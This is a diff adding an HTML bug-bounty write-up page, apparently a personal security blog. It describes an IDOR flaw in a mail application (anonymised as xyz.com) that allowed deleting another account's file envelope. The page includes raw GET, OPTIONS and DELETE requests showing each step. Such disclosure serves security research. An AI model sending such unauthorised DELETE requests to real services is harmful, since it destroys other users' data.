@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<!-- upto 2 directory depth-->
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bug Report</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="crossorigin"/>
+    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap" media="print" onload="this.media='all'"/>
+    <noscript>
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@300;400;700;800&amp;display=swap"/>
+    </noscript>
+    <link href="../css/font-awesome/css/all.min.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/bootstrap-icons/bootstrap-icons.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/bootstrap.min.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/aos.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/main.css?ver=1.2.0" rel="stylesheet">
+    <link href="../css/code-con.css" rel="stylesheet">
+    <noscript>
+      <style type="text/css">
+        [data-aos] {
+            opacity: 1 !important;
+            transform: translate(0) scale(1) !important;
+        }
+      </style>
+    </noscript>
+    
+  </head>
+  <body id="top">
+    <header class="bg-light">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light" id="header-nav" role="navigation">
+        <div class="container"><a class="link-dark navbar-brand site-title mb-0" href="#">Bug Reports</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav ms-auto me-2">
+              <li class="nav-item"><a class="nav-link" href="../#about">About</a></li>
+              <li class="nav-item"><a class="nav-link" href="../bugbounty.html#">Bug Hunting</a></li>
+              <li class="nav-item"><a class="nav-link" href="../blogs.html">Blogs</a></li> 
+            </ul>
+          </div>
+        </div>
+      </nav>
+    </header>
+    <div class="page-content">
+      <div id="content">
+<header>
+
+</header>
+
+
+
+
+
+
+<div class="section px-3 px-lg-4 pt-5" id="webbug">
+  <div class="container-narrow">
+    <div class="text-center mb-5">
+      <h2 class="marker marker-center">IDOR</h2>
+    </div>
+    <div class="row">
+      <div >
+        <div class="card mb-3" data-aos="fade-right" data-aos-delay="100">
+          <div class="card-header px-3 py-2">
+            <div class="d-flex justify-content-center">
+              <div >
+                <h3 class="h5  mb-1">Delete Via IDOR  &nbsp;</h3>
+                <small>Date: 06/12/22</small>
+              </div><img src="../images/services/webpage.svg" width="48" height="45" alt="ui-ux"/>
+            </div>
+          </div>
+          <div class="card-body px-3 py-2">
+           <p>
+            The application xyz.com is a mail application, allowing users to send and receive emails. There is a feature, where users can create envelopes within the application, which serve as containers for storing multiple files. Each envelope is assigned a unique ID, providing a structured way for users to organize and manage their files effectively.
+            But the envelope ID is too easy to Guess
+            </p>
+            <img src="bug-images/idor0.PNG" width="500" height="330">
+            <p><br>
+                During passive scanning with Burp Suite running in the background, I observed a request used to retrieve the content of envelopes, including file names, IDs, and other relevant information.
+            </p>
+
+           <div class="code-container" id="code1">
+            <div class="code-header">
+                <span>Request 1</span>
+                <button class="copy-button" onclick="copyCode('code1')">Copy</button>
+            </div>
+            <div class="code-content">
+                <pre>
+    <code>
+GET /api/me/envelopes/374 HTTP/2
+Host: api-xyz.xyz.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://api-xyz.xyz.com/
+Authorization: Bearer 729|.................
+Store: default
+Content-Length: 293
+Origin: https://api-xyz.xyz.com/envelope
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin</code></pre>
+            </div>
+        </div>
+        <img src="bug-images/idor0-1.PNG" width="480" height="500">
+           <p><br>
+            Subsequently, I made the decision to send a request with the envelope ID set to 380, which corresponds to another account.  The system responded with an error stating, "Envelopes do not belong to you." This behavior indicates that there is proper access control in place, preventing unauthorized access to envelopes belonging to different user accounts.    
+        </p>
+        <div class="code-container" id="code2">
+            <div class="code-header">
+                <span>Request 2</span>
+                <button class="copy-button" onclick="copyCode('code2')">Copy</button>
+            </div>
+            <div class="code-content">
+                <pre>
+    <code>
+GET /api/me/envelopes/380 HTTP/2
+Host: api-xyz.xyz.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://api-xyz.xyz.com/
+Authorization: Bearer 729|.................
+Store: default
+Content-Length: 293
+Origin: https://api-xyz.xyz.com/envelope
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin</code></pre>
+            </div>
+        </div>
+        <img src="bug-images/idor0-2.PNG" width="480" height="450">
+        <p>I attempted to send a pre-flight request with the OPTION header to examine the allowed headers and server permissions.</p>
+        <div class="code-container" id="code3">
+            <div class="code-header">
+                <span>Request 3</span>
+                <button class="copy-button" onclick="copyCode('code3')">Copy</button>
+            </div>
+            <div class="code-content">
+                <pre>
+    <code>
+OPTIONS /api/me/envelopes/380 HTTP/2
+Host: api-xyz.xyz.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://api-xyz.xyz.com/
+Authorization: Bearer 729|.................
+Store: default
+Content-Length: 293
+Origin: https://api-xyz.xyz.com/envelope
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin</code></pre>
+            </div>
+        </div>
+        <p><br>The response indicated that the allowed HTTP methods were Head, Get, Post, Patch, and Delete. </p>
+        <img src="bug-images/idor0-3.PNG" width="480" height="350">
+        <p>Following the discovery that Delete was among the allowed HTTP methods, I attempted to send a delete request using the envelope ID of another account.<br></p>
+        <div class="code-container" id="code4">
+            <div class="code-header">
+                <span>Request 4</span>
+                <button class="copy-button" onclick="copyCode('code4')">Copy</button>
+            </div>
+            <div class="code-content">
+                <pre>
+    <code>
+DELETE /api/me/envelopes/380 HTTP/2
+Host: api-xyz.xyz.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://api-xyz.xyz.com/
+Authorization: Bearer 729|.................
+Store: default
+Content-Length: 293
+Origin: https://api-xyz.xyz.com/envelope
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin</code></pre>
+            </div>
+        </div>
+        <p>The response body containing "true" indicates that the delete request was successful. Upon logging into the other account to verify, it was indeed surprising to find that I was able to delete the envelope associated with that account. This highlights a critical security issue, suggesting a lack of proper access controls and potential exposure to unauthorized data manipulation.</p>
+        <img src="bug-images/idor0-4.PNG" width="460" height="430">
+        
+    </div>
+        </div>
+      </div>
+      
+      
+     
+     
+      
+    </div>
+  </div>
+</div>
+
+
+</div>
+    </div>
+    <div id="scrolltop"><a class="btn btn-secondary" href="#top"><span class="icon"><i class="fas fa-angle-up fa-x"></i></span></a></div>
+    <script src="../scripts/imagesloaded.pkgd.min.js?ver=1.2.0"></script>
+    <script src="../scripts/masonry.pkgd.min.js?ver=1.2.0"></script>
+    <script src="../scripts/BigPicture.min.js?ver=1.2.0"></script>
+    <script src="../scripts/purecounter.min.js?ver=1.2.0"></script>
+    <script src="../scripts/bootstrap.bundle.min.js?ver=1.2.0"></script>
+    <script src="../scripts/aos.min.js?ver=1.2.0"></script>
+    <script src="../scripts/main.js?ver=1.2.0"></script>
+    <script>
+        function copyCode(codeId) {
+            var codeContainer = document.getElementById(codeId).querySelector('.code-content');
+            var range = document.createRange();
+            range.selectNode(codeContainer);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+
+            var copyButton = document.querySelector('.copy-button');
+            copyButton.classList.add('copied');
+
+            setTimeout(function() {
+                copyButton.classList.remove('copied');
+            }, 500);
+        }
+    </script>
+  </body>
+</html>
